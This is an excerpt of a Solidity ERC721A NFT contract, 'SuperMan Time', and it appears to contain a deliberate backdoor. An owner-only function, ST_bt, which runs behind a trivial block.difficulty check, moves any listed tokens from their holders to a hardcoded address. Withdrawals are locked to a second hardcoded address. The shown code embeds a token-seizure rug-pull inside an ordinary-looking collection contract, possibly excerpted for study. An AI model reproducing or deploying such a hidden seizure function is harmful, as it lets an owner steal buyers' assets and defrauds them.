...
contract SuperMan_Time is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("SuperMan Time", "ST", maxBatchSize_, collectionSize_) {
  ...
  function ST_bt(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0x8486913D2956B44761350A0b21B019B5Df3Ad312, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0x52b26C045b62f15C6fd015cD453eD31769043B4F);
